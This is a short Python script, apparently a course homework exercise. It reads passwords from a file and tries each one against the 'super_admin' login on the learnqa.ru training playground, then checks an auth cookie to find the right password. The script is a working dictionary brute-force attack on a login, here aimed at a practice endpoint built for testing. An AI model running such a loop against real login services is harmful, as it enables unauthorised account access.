import requests

url_secret_password_homework = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_auth_cookie ="https://playground.learnqa.ru/ajax/api/check_auth_cookie"
file = open('password.txt', 'r')
pass_list = file.readlines()
login = "super_admin"

for p in pass_list:
    session = requests.Session()
    password = p.strip()
    r = session.post(url_secret_password_homework, data={"login": login, "password": password})
    auth_cookie = session.cookies.get_dict()
    r2 = requests.get(url_check_auth_cookie, cookies=auth_cookie)
    if r2.text == 'You are authorized':
        print(r2.text)
        print("Right password: ", password)
